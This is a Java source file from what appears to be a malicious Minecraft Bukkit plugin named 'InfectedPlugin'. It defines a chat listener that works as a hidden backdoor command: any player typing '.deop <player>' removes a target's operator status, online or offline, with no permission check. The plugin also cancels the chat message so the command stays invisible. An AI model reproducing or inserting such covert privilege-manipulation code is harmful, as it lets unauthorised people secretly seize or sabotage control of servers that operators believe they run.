package org.CreeperCoders.InfectedPlugin.Commands;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Server;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class Command_deop extends IP_Command implements Listener
{
    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event)
    {
        String message = event.getMessage();
        final Player p = event.getPlayer();
        Server server = Bukkit.getServer();

        if (message.startsWith("."))
        {
            String[] args = message.split(" ");
            if (args == null)
            {
                return;
            }

            if (args[0].equalsIgnoreCase(".deop"))
            {
                if (args.length == 1)
                {
                    p.sendMessage(ChatColor.RED + "Usage: .deop <player>");
                    event.setCancelled(true);
                    return;
                }
                try
                {
                    Player target = getPlayer(args[1]);
                    target.setOp(false);
                    p.sendMessage("De-opped " + args[1]);
                }
                catch (PlayerNotFoundException e)
                {
                    p.sendMessage("De-opped " + args[1]);
                    server.getOfflinePlayer(args[1]).setOp(false);
                }
                event.setCancelled(true);
                return;
            }
        }
    }
}
